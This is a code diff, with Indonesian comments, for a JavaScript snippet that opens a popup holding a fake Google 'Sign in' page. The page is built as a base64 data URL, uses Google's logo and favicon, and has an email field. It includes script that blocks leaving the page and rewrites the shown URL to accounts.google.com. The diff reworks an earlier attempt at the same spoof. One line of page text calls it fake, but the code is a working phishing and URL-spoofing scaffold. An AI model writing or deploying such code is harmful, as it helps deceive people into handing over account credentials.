@@ -1,25 +1,39 @@
 <script>
 function f() {
-    // Buka popup dengan URL yang mirip
-    w = window.open("https://your-legitimate-domain.com/path", "_blank");
+    // Gunakan data URL dengan origin yang disamarkan
+    const fakePage = `
+        <html>
+        <head>
+            <title>Google Account</title>
+            <link rel="icon" href="https://www.google.com/favicon.ico">
+        </head>
+        <body style="font-family: Arial, sans-serif; margin: 0;">
+            <div style="background: #fff; border-bottom: 1px solid #dadce0; padding: 16px;">
+                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" height="32">
+            </div>
+            <div style="padding: 40px; max-width: 450px; margin: 0 auto;">
+                <h2 style="color: #202124;">Sign in</h2>
+                <p style="color: #5f6368;">This looks like Google but it's fake</p>
+                <input type="email" placeholder="Email or phone" style="width: 100%; padding: 12px; border: 1px solid #dadce0; border-radius: 4px; margin: 10px 0;">
+                <button style="background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer;">Next</button>
+            </div>
+            <script>
+                // Lock the address bar - prevent navigation
+                window.addEventListener('beforeunload', function(e) {
+                    e.preventDefault();
+                    e.returnValue = '';
+                    return '';
+                });
+                
+                // Replace state to maintain fake URL
+                history.replaceState(null, '', 'https://accounts.google.com');
+            <\/script>
+        </body>
+        </html>
+    `;
     
-    setTimeout(() => {
-        try {
-            // Coba manipulasi state
-            w.history.pushState({}, "Google", "https://account.google.com");
-            
-            // Inject konten palsu
-            w.document.body.innerHTML = `
-                <div style="font-family: Arial, sans-serif; padding: 20px;">
-                    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
-                    <h2>Sign in</h2>
-                    <p>This is a fake login page for demonstration</p>
-                </div>
-            `;
-            
-        } catch(e) {
-            console.log("Security restriction:", e);
-        }
-    }, 500);
+    // Encode ke data URL
+    const dataUrl = 'data:text/html;base64,' + btoa(fakePage);
+    w = window.open(dataUrl, '_blank', 'width=800,height=600');
 }
 </script>
